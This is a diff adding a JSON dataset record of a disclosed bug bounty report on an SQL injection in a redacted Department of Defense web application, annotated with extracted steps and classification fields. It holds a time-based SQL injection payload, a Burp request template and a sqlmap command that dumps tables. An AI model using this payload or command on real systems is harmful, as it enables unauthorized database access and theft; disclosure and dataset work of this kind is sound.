@@ -1,0 +1,49 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "brumens ",
+    "title": "SQL injection located in `\u2588\u2588\u2588` in POST param `\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588` ",
+    "content": "\nHey DoD security team!\nI was able to exploit an SQL injection [1] in one of your domains.\nDescription\nAn SQL injection [1] was discovered in domain https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588 in the parameter \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588. The SQL injection was located in a WHERE statment fallowed by a INT value.\nThe vulnerable parameter gave an indication quick with an SQL syntax error. That exposed it was an \u2588\u2588\u2588\u2588 database [2] in the backend.\nProof Of Concept\nDiscovered the SQL injection by inputting an random value to trigger an SQL syntax error.\nDiscover_Payload: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\nThe fallowing payload was used for the SQL injection to be be triggered\nPayload: 2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)\n\u2588\u2588\u2588\u2588\u2588\u2588\nFull exploit and gather information from the MYSQL database:\n\u2588\u2588\u2588\u2588\nReferences\n[1] https://portswigger.net/web-security/sql-injection - SQL injection explained\n[2] https://www.mysqltutorial.org/mysql-where/ - MYSQL WHERE statment explained\n[3] https://www.mysql.com/ - MYSQL Database\nImpact\nAn attacker is able to gather all information stored in the database using boolen based SQL injection. (FULL database controll.)\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nThe whole database is affected and I'm able to gather all information stored in it.\nCVE Numbers\nSteps to Reproduce\nGo to the domain **\nNow intercept the request with Burp Suite.\nReplace the raw data with the fallowing:\nCode 473 Bytes\n1POST /\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Content-Type: application/x-www-form-urlencoded\n8Content-Length: 106\n9Origin: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n10Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n11Upgrade-Insecure-Requests: 1\n12Te: trailers\n13Connection: close\n14\n15\u2588\u2588\u2588\u2588\u2588\u2588=2021\u2588\u2588\u2588\u2588\u2588\n4 . Save request in Burp Suite => Right click => save item + Name it.\n5. Run sqlmap command: sqlmap -f --risk 2 -r /home/kali/Desktop/sql --dbms=mysql --tables --dump -p \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.\nIt will quick discover the \u2588\u2588\u2588 to be vulnerable for SQL injection and XSS. Wait to it detect and verify it. It will then dump the tables.\nas fallowing: (Only gather table and stoped after just as a proof of concept)\n\u2588\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\nMake sure to filter out SQL syntax and quotes and never trust user input.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "SQL Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1631232000,
+    "report_url": "https://hackerone.com/reports/1262757",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Intercept the request to the vulnerable endpoint using Burp Suite."
+        ],
+        [
+            2,
+            "Modify the POST parameter with the SQL injection payload: `2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)`."
+        ],
+        [
+            3,
+            "Use sqlmap to automate the exploitation: `sqlmap -f --risk 2 -r /home/kali/Desktop/sql --dbms=mysql --tables --dump -p [parameter_name]`."
+        ]
+    ],
+    "vuln_description": "An SQL injection vulnerability was found in a POST parameter of a web application, allowing an attacker to execute arbitrary SQL queries and potentially gain full control over the MySQL database.",
+    "reason": "The vulnerability involves straightforward SQL injection techniques with no complex interactions or novel logic required. The attack is well-documented and uses common tools like Burp Suite and sqlmap.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "reason": "The SQL injection vulnerability involves manipulating input parameters to trigger database errors or extract information, which is not directly related to authentication or authorization bypass through session or resource ID manipulation. The described methodology focuses on AuthN/AuthZ bypass and IDOR by testing session and resource ID combinations, not input parameter manipulation for SQL injection.",
+        "is_detectable": false
+    }
+}
